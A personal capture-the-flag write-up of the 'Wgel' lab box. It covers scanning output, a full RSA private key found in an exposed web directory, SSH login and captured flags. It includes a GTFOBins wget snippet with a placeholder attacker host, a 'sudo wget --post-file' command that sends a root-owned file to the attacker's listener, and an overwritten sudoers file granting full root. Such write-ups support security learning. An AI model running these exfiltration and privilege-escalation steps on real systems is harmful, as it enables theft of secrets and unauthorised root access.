This box, was troubling, everything went past my eyes, I though that it was manual enumeration of the site when everything was right there. 

https://sckull.github.io/posts/wgel/

Nmap 2 open ports
22
80


dirserach gives us the directory of /sitemap

when enumerating /sitemap the directory medium list doesn't have /.ssh extension which is mindblowing, so I didn't see that, on gobuster or default list of dirsearch it would have picked it up. 

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ dirsearch -u http://10.10.97.14/sitemap/ 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
Wordlist size: 10877

Output File: /home/kali/.dirsearch/reports/10.10.97.14/sitemap_21-06-07_10-02-45.txt

Error Log: /home/kali/.dirsearch/logs/errors-21-06-07_10-02-45.log

Target: http://10.10.97.14/sitemap/

[10:02:46] Starting: 
[10:02:47] 301 -  315B  - /sitemap/js  ->  http://10.10.97.14/sitemap/js/
[10:02:48] 200 -   14KB - /sitemap/.DS_Store
[10:02:50] 403 -  276B  - /sitemap/.ht_wsr.txt
[10:02:50] 403 -  276B  - /sitemap/.htaccess_orig
[10:02:50] 403 -  276B  - /sitemap/.htaccess_extra
[10:02:50] 403 -  276B  - /sitemap/.htaccess.bak1
[10:02:50] 403 -  276B  - /sitemap/.htaccess.save
[10:02:50] 403 -  276B  - /sitemap/.htaccess.orig
[10:02:50] 403 -  276B  - /sitemap/.htaccessBAK
[10:02:50] 403 -  276B  - /sitemap/.htaccess.sample
[10:02:50] 403 -  276B  - /sitemap/.htaccessOLD
[10:02:50] 403 -  276B  - /sitemap/.htaccess_sc
[10:02:50] 403 -  276B  - /sitemap/.htpasswds
[10:02:50] 403 -  276B  - /sitemap/.htaccessOLD2
[10:02:50] 403 -  276B  - /sitemap/.httr-oauth
[10:02:50] 403 -  276B  - /sitemap/.htm
[10:02:50] 403 -  276B  - /sitemap/.htpasswd_test
[10:02:50] 403 -  276B  - /sitemap/.html
[10:02:54] 200 -   11KB - /sitemap/.sass-cache/
[10:02:55] 200 -    2KB - /sitemap/.ssh/id_rsa
[10:02:55] 200 -  953B  - /sitemap/.ssh/
[10:02:55] 301 -  317B  - /sitemap/.ssh  ->  http://10.10.97.14/sitemap/.ssh/
[10:03:01] 200 -   12KB - /sitemap/about.html
[10:03:13] 200 -   10KB - /sitemap/contact.html
[10:03:14] 301 -  316B  - /sitemap/css  ->  http://10.10.97.14/sitemap/css/
[10:03:17] 301 -  318B  - /sitemap/fonts  ->  http://10.10.97.14/sitemap/fonts/
[10:03:18] 301 -  319B  - /sitemap/images  ->  http://10.10.97.14/sitemap/images/
[10:03:18] 200 -    8KB - /sitemap/images/
[10:03:19] 200 -   21KB - /sitemap/index.html
[10:03:20] 200 -    4KB - /sitemap/js/

Task Completed
 

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```
do ssh2john and we get--- 

no password!

we ssh in and find the user flat in documents

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ ssh jessie@10.10.97.14 -i id_rsa       
The authenticity of host '10.10.97.14 (10.10.97.14)' can't be established.
ECDSA key fingerprint is SHA256:9XK3sKxz9xdPKOayx6kqd2PbTDDfGxj9K9aed2YtF0A.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.97.14' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ ls
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
jessie@CorpOne:~$ cd Documents
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt
057c67131c3d5e42dd5cd3075b198ff6
jessie@CorpOne:~/Documents$ cd /root
-bash: cd: /root: Permission denied
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

GTFO FOR THIS IS 

    sudo install -m =xs $(which wget) .
	
	URL=http://attacker.com/file_to_get
	LFILE=file_to_save
	./wget $URL -O $LFILE


we set up a listner on 80 

and send the script

`sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.6.65.43`


```bash
jessie@CorpOne:/$ sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.6.65.43
--2021-06-07 16:13:21--  http://10.6.65.43/
Connecting to 10.6.65.43:80... connected.
HTTP request sent, awaiting response... sudo 
```

we get a response

```bash
┌──(kali㉿kali)-[~/Documents]
└─$ nc -lnvp 80      
listening on [any] 80 ...
connect to [10.6.65.43] from (UNKNOWN) [10.10.97.14] 42494
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.6.65.43
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d

```
now the write goes on to obtain a root shell, not required to complete room but yes, we got the flag but we are not root

learned about the second tack on sudo -l -l
```ssh
jessie@CorpOne:/$ sudo -l -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:

Sudoers entry:
    RunAsUsers: ALL
    RunAsGroups: ALL
    Commands:
	ALL

Sudoers entry:
    RunAsUsers: root
    Options: !authenticate
    Commands:
	/usr/bin/wget
	
```
	
VS
	
```bash
jessie@CorpOne:/$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
jessie@CorpOne:/$ 
```

It opens it up a bit nicer to read ,,, 

### to get root

so you make a sudoers file and serve it ,, 


sudoers file
#jessie  ALL=(root) NOPASSWD: /usr/bin/wget
jessie  ALL=(ALL) NOPASSWD: ALL


grab it
```bash
sudo /usr/bin/wget 10.8.1.72/sudoers --output-document=sudoers
```

and sudo su to execute
